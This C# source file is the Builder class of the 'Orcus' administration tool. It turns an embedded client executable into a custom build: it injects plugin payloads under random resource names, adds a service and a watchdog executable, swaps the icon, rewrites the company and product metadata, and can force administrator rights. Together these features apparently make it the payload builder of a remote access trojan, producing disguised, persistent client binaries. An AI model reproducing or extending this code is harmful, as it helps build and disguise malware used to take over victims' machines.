using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows;
using System.Xml;
using Mono.Cecil;
using Orcus.Administration.Core.Plugins;
using Orcus.Administration.Core.Plugins.Wrappers;
using Orcus.Administration.Plugins.BuildPlugin;
using Orcus.Shared.Client;
using Orcus.Shared.Core;
using Orcus.Shared.Settings;
using Sorzus.Wpf.Toolkit.Converter;
using Vestris.ResourceLib;
using ResourceType = Orcus.Shared.Client.ResourceType;

namespace Orcus.Administration.Core.Build
{
    public class Builder
    {
        public delegate void ApplySettingsDelegate(
            AssemblyDefinition assemblyDefinition, List<IBuilderProperty> settings,
            List<PluginResourceInfo> pluginResources, List<ClientPlugin> plugins, IBuildLogger buildLogger);

        public static ApplySettingsDelegate ApplySettings { get; set; }

        public void Build(IBuilderInformation builderInformation, List<IBuilderProperty> properties,
            List<BuildPluginEvent> builderEvents, List<ClientPlugin> plugins, IBuildLogger buildLogger)
        {
            buildLogger.Status(string.Format((string) Application.Current.Resources["BuildStatusLoadingStream"],
                properties.GetBuilderProperty<FrameworkVersionBuilderProperty>().FrameworkVersion));

            Stream stream = null;

            var loadStreamPlugins = builderEvents.Where(x => x.BuilderEvent is LoadStreamBuilderEvent).ToList();
            if (loadStreamPlugins.Count == 0)
            {
                var resource =
                    Application.GetResourceStream(
                        new Uri(
                            $"pack://application:,,,/Orcus.Administration.Resources;component/Client/{properties.GetBuilderProperty<FrameworkVersionBuilderProperty>().FrameworkVersion}/Orcus.exe"));

                if (resource == null)
                    throw new FileNotFoundException();

                stream = resource.Stream;
            }
            else if (loadStreamPlugins.Count == 1)
            {
                stream = ((LoadStreamBuilderEvent) loadStreamPlugins.Single().BuilderEvent).LoadStream(builderInformation);
                buildLogger.Warn("BuildPlugin \"" + loadStreamPlugins[0].BuildPlugin.PluginInfo.Name +
                                 "\" modified the source stream. The output won't be the original Orcus made by Orcus Technologies.");
            }
            else if (loadStreamPlugins.Count > 1)
            {
                throw new Exception(
                    $"The following build plugins want to change the source of the Orcus assembly: {string.Join(", ", loadStreamPlugins.Select(x => x.BuildPlugin.PluginInfo.Name))}. Please deselect all but one of these plugins to successfully build Orcus.");
            }

            using (stream)
            {
                buildLogger.Success(string.Format((string) Application.Current.Resources["BuildStatusStreamLoaded"],
                    FormatBytesConverter.BytesToString(stream.Length)));
                var assemblyDefinition = AssemblyDefinition.ReadAssembly(stream,
                    new ReaderParameters {AssemblyResolver = new AssemblyResolver(buildLogger)});

                buildLogger.Status((string) Application.Current.Resources["BuildStatusInjectingPlugins"]);

                List<PluginResourceInfo> installedPlugins;
                InstallPlugins(assemblyDefinition, plugins, buildLogger, out installedPlugins);

                buildLogger.Status((string) Application.Current.Resources["BuildStatusWritingSettings"]);
                ApplySettings(assemblyDefinition, properties, installedPlugins, plugins, buildLogger);
                AddResources(assemblyDefinition, properties, buildLogger);

                builderEvents.ExecuteBuildPluginEvents<ModifyAssemblyBuilderEvent>(
                    x => x.ModifyAssembly(builderInformation, assemblyDefinition));

                buildLogger.Status((string) Application.Current.Resources["BuildStatusSavingOnDisk"]);
                assemblyDefinition.Write(
                    builderInformation.OutputFiles.Single(x => x.OutputFileType == OutputFileType.MainAssembly).Path);
                buildLogger.Success((string) Application.Current.Resources["BuildStatusSavedSuccessfully"]);
            }

            builderEvents.ExecuteBuildPluginEvents<ClientFileCreatedBuilderEvent>(
                x => x.ClientFileCreated(builderInformation));

            var iconInfo = properties.GetBuilderProperty<ChangeIconBuilderProperty>();
            if (iconInfo.ChangeIcon)
            {
                buildLogger.Status((string) Application.Current.Resources["BuildStatusChangingIcon"]);
                Thread.Sleep(2000); //Wait for the filestream to close
                IconInjector.InjectIcon(builderInformation.AssemblyPath, iconInfo.IconPath);
                buildLogger.Success((string) Application.Current.Resources["BuildStatusIconChanged"]);
            }

            var assemblyInfo = properties.GetBuilderProperty<ChangeAssemblyInformationBuilderProperty>();
            if (assemblyInfo.ChangeAssemblyInformation)
            {
                buildLogger.Status((string) Application.Current.Resources["BuildStatusApplyingAssemblyInformation"]);
                Thread.Sleep(2000); //Wait for the filestream to close
                ApplyAssemblyInformation(builderInformation.AssemblyPath, assemblyInfo);
                buildLogger.Success((string) Application.Current.Resources["BuildStatusAssemblyInformationApplied"]);
            }

            if (properties.GetBuilderProperty<DefaultPrivilegesBuilderProperty>().RequireAdministratorRights)
            {
                buildLogger.Status((string) Application.Current.Resources["BuildStatusChangingManifest"]);
                Thread.Sleep(2000); //Wait for the filestream to close
                ApplyManifest(builderInformation.AssemblyPath);
                buildLogger.Success((string) Application.Current.Resources["BuildStatusManifestChanged"]);
            }

            builderEvents.ExecuteBuildPluginEvents<ClientFileModifiedBuilderEvent>(
                x => x.ClientFileModified(builderInformation));

            builderEvents.ExecuteBuildPluginEvents<ClientBuildCompletedBuilderEvent>(
                x => x.ClientBuildCompleted(builderInformation));
        }

        private void AddResources(AssemblyDefinition assemblyDefinition, List<IBuilderProperty> settings, IBuildLogger buildLogger)
        {
            if (settings.GetBuilderProperty<ServiceBuilderProperty>().Install)
            {
                buildLogger.Status(string.Format((string) Application.Current.Resources["BuildStatusAddResource"],
                    "Orcus.Service.exe.gz"));
                var resource =
                    Application.GetResourceStream(
                        new Uri(
                            "pack://application:,,,/Orcus.Administration.Resources;component/Client/Features/Orcus.Service.exe.gz"));
                if (resource == null)
                    throw new FileNotFoundException();
                using (var stream = resource.Stream)
                {
                    //Don't directly give the stream but load it into memory to dispose the resource afterwards
                    var data = new byte[stream.Length];
                    stream.Read(data, 0, (int) stream.Length);
                    assemblyDefinition.MainModule.Resources.Add(new EmbeddedResource("Orcus.Service.exe.gz",
                        ManifestResourceAttributes.Private, data));
                }
                buildLogger.Status(string.Format((string) Application.Current.Resources["BuildStatusResourceAdded"],
                    "Orcus.Service.exe.gz"));
            }

            if (settings.GetBuilderProperty<WatchdogBuilderProperty>().IsEnabled)
            {
                buildLogger.Status(string.Format((string) Application.Current.Resources["BuildStatusAddResource"],
                    "Orcus.Watchdog.exe.gz"));
                var resource =
                    Application.GetResourceStream(
                        new Uri(
                            "pack://application:,,,/Orcus.Administration.Resources;component/Client/Features/Orcus.Golem.exe.gz"));
                if (resource == null)
                    throw new FileNotFoundException();
                using (var stream = resource.Stream)
                {
                    //Don't directly give the stream but load it into memory to dispose the resource afterwards
                    var data = new byte[stream.Length];
                    stream.Read(data, 0, (int)stream.Length);
                    assemblyDefinition.MainModule.Resources.Add(new EmbeddedResource("Orcus.Watchdog.exe.gz",
                        ManifestResourceAttributes.Private, data));
                }
                buildLogger.Status(string.Format((string) Application.Current.Resources["BuildStatusResourceAdded"],
                    "Orcus.Watchdog.exe.gz"));
            }
        }

        private void InstallPlugins(AssemblyDefinition assemblyDefinition, IEnumerable<IPayload> plugins, IBuildLogger buildLogger, out List<PluginResourceInfo> installedPlugins)
        {
            installedPlugins = new List<PluginResourceInfo>();

            foreach (var plugin in plugins)
            {
                buildLogger.Status(string.Format((string) Application.Current.Resources["BuildStatusLoadingPlugin"], plugin.PluginInfo.Name));
                var payload = plugin.GetPayload();
                buildLogger.Status(string.Format((string) Application.Current.Resources["BuildStatusPluginLoaded"], FormatBytesConverter.BytesToString(payload.Length)));
                var resourceName = Guid.NewGuid().ToString("N");
                assemblyDefinition.MainModule.Resources.Add(new EmbeddedResource(resourceName, ManifestResourceAttributes.Private, payload));
                buildLogger.Success(string.Format((string) Application.Current.Resources["BuildStatusPluginInjected"], resourceName));

                ResourceType resourceType;
                if (plugin is ClientPlugin)
                    resourceType = ResourceType.ClientPlugin;
                else if (plugin is FactoryCommandPlugin)
                    resourceType = ResourceType.FactoryCommand;
                else
                    resourceType = ResourceType.Command;

                installedPlugins.Add(new PluginResourceInfo
                {
                    ResourceName = resourceName,
                    ResourceType = resourceType,
                    Guid = plugin.PluginInfo.Guid,
                    PluginName = plugin.PluginInfo.Name,
                    PluginVersion = plugin.PluginInfo.Version.ToString()
                });
            }
        }

        private static void ApplyAssemblyInformation(string path, ChangeAssemblyInformationBuilderProperty settings)
        {
            var versionResource = new VersionResource();
            versionResource.LoadFrom(path);

            versionResource.FileVersion = settings.AssemblyFileVersion;
            versionResource.ProductVersion = settings.AssemblyProductVersion;
            versionResource.Language = 0;

            var stringFileInfo = (StringFileInfo) versionResource["StringFileInfo"];
            stringFileInfo["InternalName"] = settings.AssemblyTitle;
            stringFileInfo["FileDescription"] = settings.AssemblyDescription;
            stringFileInfo["CompanyName"] = settings.AssemblyCompanyName;
            stringFileInfo["ProductName"] = settings.AssemblyProductName;
            stringFileInfo["LegalCopyright"] = settings.AssemblyCopyright;
            stringFileInfo["LegalTrademarks"] = settings.AssemblyTrademarks;
            stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
            stringFileInfo["FileVersion"] = versionResource.FileVersion;

            versionResource.SaveTo(path);
        }

        private static void ApplyManifest(string path)
        {
            var manifestResource = new ManifestResource();
            var manifestXml = new XmlDocument();
            manifestXml.LoadXml(Properties.Resources.RequireAdministratorManifest);
            manifestResource.Manifest = manifestXml;
            manifestResource.SaveTo(path);
        }
    }
}